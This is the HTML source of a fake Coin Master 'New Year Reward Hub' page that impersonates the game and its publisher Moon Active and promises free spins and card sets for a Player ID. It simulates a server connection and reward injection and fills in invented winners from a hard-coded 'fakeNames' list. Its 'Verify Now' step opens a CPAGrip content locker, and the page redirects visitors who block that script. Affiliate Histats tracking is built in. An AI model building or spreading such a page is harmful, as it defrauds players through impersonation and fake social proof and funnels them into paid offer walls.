<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coin Master - Official New Year Reward Hub</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
    <link rel="icon" href="./Coin_Master_logo.webp" type="image/x-icon">
    
    <!-- FITUR 1: KONFIGURASI TERPUSAT -->
    <script src="/config.js"></script>

    <style>
        :root { --primary: #00d2ff; --accent: #ffcc00; --gold: #f1c40f; --bg-dark: #001220; }
        body { margin: 0; font-family: 'Poppins', sans-serif; color: #fff; background: var(--bg-dark); overflow-x: hidden; }
        
        /* Aurora Background - Cyan/Blue for Coin Master */
        .aurora-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(0, 210, 255, 0.4), transparent 50%), radial-gradient(circle at 90% 80%, rgba(255, 204, 0, 0.15), transparent 50%), linear-gradient(180deg, #050812 0%, #001a33 100%); }
        
        .header { width: 100%; height: 70px; background: #24A1DE; display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--accent); position: fixed; top: 0; z-index: 1000; }
        .header-content { display: flex; align-items: center; gap: 15px; }
        .header img { height: 65px; }
        .publisher-separator { width: 1px; height: 25px; background: black; }
        .publisher-logo { height: 25px !important; }

        .container { display: flex; max-width: 1100px; margin: 100px auto 40px; gap: 20px; padding: 0 15px; flex-wrap: wrap; }
        .main-content { flex: 1; min-width: 300px; text-align: center; }
        .card-panel { background: rgba(255, 255, 255, 0.98); border-radius: 25px; padding: 25px; color: #333; border: 3px solid var(--gold); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        
        .hero-icon { width: 120px; margin: 10px auto; animation: float 3s ease-in-out infinite; filter: drop-shadow(0 0 15px var(--primary)); }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }

        /* Security Note Style */
        .security-note { font-size: 11px; background: #fff5f5; color: #d32f2f; padding: 10px; border-radius: 10px; border: 1px dashed #d32f2f; margin-bottom: 15px; line-height: 1.4; }

        .online-counter { display: inline-flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 6px 15px; border-radius: 999px; margin-bottom: 15px; border: 1px solid rgba(0, 210, 255, 0.5); }
        .dot-live { width: 8px; height: 8px; background: #27ae60; border-radius: 50%; box-shadow: 0 0 8px #27ae60; animation: pulseLive 2s infinite; }
        @keyframes pulseLive { 0% { transform: scale(0.9); opacity: 1; } 70% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }
        
        .tg-notif { position: fixed; bottom: -100px; left: 20px; background: #fff; color: #333; padding: 12px 18px; border-radius: 15px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); z-index: 9999; border-left: 5px solid #24A1DE; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
        .tg-notif img { width: 40px; border-radius: 50%; }
        .tg-notif-text { font-size: 11px; line-height: 1.4; text-align: left; }

        .sidebar { width: 280px; background: #fff; border-radius: 20px; padding: 20px; color: #333; height: fit-content; border: 1px solid #ddd; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        @media (max-width: 850px) { .sidebar { display: none; } .container { justify-content: center; } }
        .stat-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
        .winner-item { background: #f1f5f9; padding: 10px; border-radius: 10px; margin-bottom: 8px; font-size: 11px; text-align: left; border-left: 4px solid var(--primary); }

        h1 { color: var(--primary); text-transform: uppercase; font-size: 20px; font-weight: 800; }
        input[type="text"] { width: 85%; padding: 15px; border-radius: 12px; border: 2px solid #ddd; font-size: 18px; text-align: center; margin-bottom: 15px; outline: none; }
        .btn-main { background: linear-gradient(180deg, #00d2ff 0%, #008eb3 100%); color: white; padding: 16px; border-radius: 15px; font-weight: 700; cursor: pointer; border: none; width: 95%; font-size: 18px; text-transform: uppercase; }
        
        .reward-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
        .reward-item { background: #f1f5f9; border: 2px solid #eee; border-radius: 15px; padding: 12px; cursor: pointer; color: #333; font-weight: bold; }
        .reward-item.active { border-color: var(--primary); background: #e0faff; transform: scale(1.03); }
        .reward-item img { width: 50px; display: block; margin: 0 auto 5px; }
        .reward-item-sets { background: #f1f5f9; border: 2px solid #eee; border-radius: 15px; padding: 12px; cursor: pointer; color: #333; font-weight: bold; }
        .reward-item-sets.active { border-color: var(--primary); background: #e0faff; transform: scale(1.03); }
        .reward-item-sets img { width: 90px; display: block; margin: 0 auto 5px; }

        .progress-container { width: 100%; background: #eee; height: 18px; border-radius: 10px; margin: 15px 0; overflow: hidden; }
        .progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; }
        .trust-badge { margin: 5px 0 15px; display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 11px; color: #27ae60; font-weight: 600; }
    </style>

    <!-- KODE CPAGRIP JAVASCRIPT -->
    <script type="text/javascript">var lck = false;</script>
    <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1864521"></script>
    <script type="text/javascript">if(!lck){top.location = 'https://playabledownload.com/help/ablk.php?lkt=1'; }</script>
</head>
<body>
<div class="aurora-bg"></div>
<div class="header">
    <div class="header-content">
        <img src="./Coin_Master_logo.webp" alt="Coin Master">
        <div class="publisher-separator"></div>
        <img src="./Moon_Active_logo.png" class="publisher-logo" alt="MoonActive">
    </div>
</div>

<div class="container">
    <div class="main-content">
        <div class="card-panel">
            
            <!-- STEP 1: LOGIN -->
            <div id="step1">
                <img src="./Coin_Master_2024.webp" class="hero-icon">
                <h1>New Year Spins Hub</h1>
                
                <div class="online-counter">
                    <div class="dot-live"></div>
                    <span style="font-size: 12px; color: #fff;">Live: <b id="user-count">1,452</b> Spinners Online</span>
                </div>

                <!-- [NEW] SECURITY DISCLAIMER -->
                <div class="security-note">
                    üõ°Ô∏è <b>Security Protocol:</b> We will NEVER ask for your password or credit card. Only your Player ID is required to check reward eligibility.
                </div>

                <div class="trust-badge"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> MoonActive Certified</div>
                <input type="text" id="uid" placeholder="Your Player ID...">
                <button onclick="startProcess()" class="btn-main">Check Eligibility</button>
            </div>

            <!-- STEP 2: PROCESSING -->
            <div id="step-process" style="display:none">
                <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                <h2 id="counter" style="color:#333">0%</h2>
                <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
                <p id="msg" style="color:#777">Connecting <b id="username"></b> to Coin Master server...</p>
            </div>

            <!-- [NEW] STEP 3: RARE CARD SELECTION (SOLUSI BAIT) -->
            <div id="step-cards" style="display:none">
                <h1>Select Missing Card Set</h1>
                <div class="security-note">
                  <b>Note:</b> Hello <b id="usernamer"></b>, You can give or sell to friends if you already have this complete set.
                </div>
                <p style="font-size: 12px; color: #666;">Choose a card set you want to complete for free.</p>
                <div class="reward-grid">
                    <div class="reward-item-sets active" onclick="selectCardSet(this, 'Beasts')"><img src="./Beasts.png">The Beasts Set</div>
                    <div class="reward-item-sets" onclick="selectCardSet(this, 'Egypt')"><img src="./Egypt.png">Egypt Set</div>
                    <div class="reward-item-sets" onclick="selectCardSet(this, 'Pets')"><img src="./Pets.png">Pets Set</div>
                    <div class="reward-item-sets" onclick="selectCardSet(this, 'Hot Rides')"><img src="./Hot_Rides.png">Hot Rides Set</div>
                </div>
                <button onclick="goSpinsStep()" class="btn-main">Next: Choose Spins</button>
            </div>

            <!-- STEP 4: SELECT SPINS -->
            <div id="step-select" style="display:none">
                <h1>Select Spins Package</h1>
                <div class="reward-grid">
                    <div class="reward-item active" onclick="selectR(this, 5000)"><img src="./Spins2.png">5,000 Spins</div>
                    <div class="reward-item" onclick="selectR(this, 12000)"><img src="./Spins2.png">12,000 Spins</div>
                    <div class="reward-item" onclick="selectR(this, 25000)"><img src="./Spins1.png">25,000 Spins</div>
                    <div class="reward-item" onclick="selectR(this, 50000)"><img src="Spins1.png">50,000 Spins</div>
                </div>
                <button onclick="confirmReward()" class="btn-main">Claim Selection</button>
            </div>

            <!-- STEP 5: VERIFY -->
            <div id="step-verify" style="display:none">
                <h1 style="color:var(--primary)">Final Verification</h1>
                <p style="color:#333">Hi <b id="user-display"></b>, your <b><span id="final-amt"></span> Spins</b> and <b><span id="final-card"></span> Set</b> are ready. Please verify to release them.</p>
                <button onclick="call_locker_smart();" class="btn-main">Verify Now</button>
            </div>
        </div>
    </div>

    <div class="sidebar">
        <h4 style="margin-top:0; color:var(--primary)">Event Info</h4>
        <div class="stat-row"><span>Status:</span><span style="color:green; font-weight:bold;">ONLINE</span></div>
        <div class="stat-row"><span>Last Update:</span><span id="date"></span></div>
        <hr>
        <h4 style="color:var(--primary)">Recent Success</h4>
        <div id="sidebar-rewards"></div>
    </div>
</div>

<!-- TELEGRAM POPUP -->
<div id="tg-notif" class="tg-notif">
    <img src="https://cdn-icons-png.flaticon.com/128/3558/3558860.png" alt="bot">
    <div class="tg-notif-text">
        <b>Coin Master Bot</b> <br>
        <span id="tg-user">User123</span> claimed <span id="tg-reward">5,000 Spins</span>!
    </div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
    const MY_REWARD_NAME = "Spins"; 
    const MY_GAME_ID = "CoinMaster";

    let user_id = ""; let amount = 5000; let cardSet = "Beasts";
    function selectR(el, amt) { $(".reward-item").removeClass("active"); $(el).addClass("active"); amount = amt; }
    function selectCardSet(el, name) { $(".reward-item-sets").removeClass("active"); $(el).addClass("active"); cardSet = name; }
    
    function startProcess() { user_id = $("#uid").val(); if(user_id.length < 3) return alert("Enter valid ID"); $("#step1").hide(); $("#step-process").show(); $("#username").text(user_id); setTimeout(() => { $("#step-process").hide(); $("#step-cards").show(); $("#usernamer").text(user_id); }, 3500); }
    function goSpinsStep() { $("#step-cards").hide(); $("#step-select").show(); }
    
    function confirmReward() { $("#step-select").hide(); $("#step-process").show(); $("#msg").text("Injecting rewards into database..."); let c = 0; let iv = setInterval(() => { c += 2; if(c >= 100) { clearInterval(iv); $("#step-process").hide(); $("#user-display").text(user_id); $("#final-amt").text(amount.toLocaleString()); $("#final-card").text(cardSet); $("#step-verify").show(); } $("#counter").text(c + "%"); $("#p-bar").css("width", c+"%"); }, 40); }
    
    function call_locker_smart() {
        var urlParams = new URLSearchParams(window.location.search);
        var subID = urlParams.get('s1') || 'Owner'; 
        
        // Ganti MY_GAME_ID sesuai folder (MLBB/DiceDreams/FreeFire)
        var gameName = typeof MY_GAME_ID !== 'undefined' ? MY_GAME_ID : 'Unknown';
    
        if (typeof call_locker === 'function') {
            call_locker({
                s1: subID,          // Key standar
                tracking_id: subID, // Key simulator
                s2: gameName        // Nama Game
            });
        } else {
            // Fallback jika script telat load
            alert("System busy, please try again in a few seconds.");
        }
    }

    // DYNAMIC BOOSTER LOGIC
    const fakeNames = ["Mary_J", "Pete_US", "Linda_CM", "MasterSpin", "CoinHunter", "LuckyGrandma"];
    const fakeLocs = ["üá∫üá∏ USA", "üá¨üáß UK", "üá®üá¶ Canada", "üá©üá™ Germany"];
    const baseAmounts = [5000, 12000, 25000, 50000];

    function updateSidebar() {
        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)];
        let html = `<div class="winner-item">Spinner <b>${name}</b> claimed ${amt.toLocaleString()} ${MY_REWARD_NAME}<br><small>Just now</small></div>`;
        $("#sidebar-rewards").prepend(html);
        if($("#sidebar-rewards .winner-item").length > 4) $("#sidebar-rewards .winner-item:last").remove();
        setTimeout(updateSidebar, 6000);
    }
    updateSidebar();

    function showRewardNotif() {
        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
        let loc = fakeLocs[Math.floor(Math.random() * fakeLocs.length)];
        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)];
        $("#tg-user").text(name + " ¬∑ " + loc);
        $("#tg-reward").text(amt.toLocaleString() + " " + MY_REWARD_NAME);
        $("#tg-notif").css("bottom", "20px");
        setTimeout(() => { $("#tg-notif").css("bottom", "-100px"); }, 4500);
        setTimeout(showRewardNotif, 12000);
    }
    setTimeout(showRewardNotif, 5000);

    document.getElementById("date").innerHTML = new Date().getDate() + "/" + (new Date().getMonth()+1);
</script>

<!-- SMART HISTATS -->
<script type="text/javascript">
    var urlParams = new URLSearchParams(window.location.search); var subID = urlParams.get('s1') || 'Owner';
    var activeHistatsID = teamConfig[subID] || teamConfig['Owner'];
    var _Hasync= _Hasync|| []; _Hasync.push(['Histats.start', '1,' + activeHistatsID + ',4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']); _Hasync.push(['Histats.track_hits', '']);
    _Hasync.push(['Histats.custom_variable', ['Game', MY_GAME_ID]]);
    _Hasync.push(['Histats.custom_variable', ['Member', subID]]);
    (function() { var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true; hs.src = ('//s10.histats.com/js15_as.js'); (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs); })();
</script>

<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>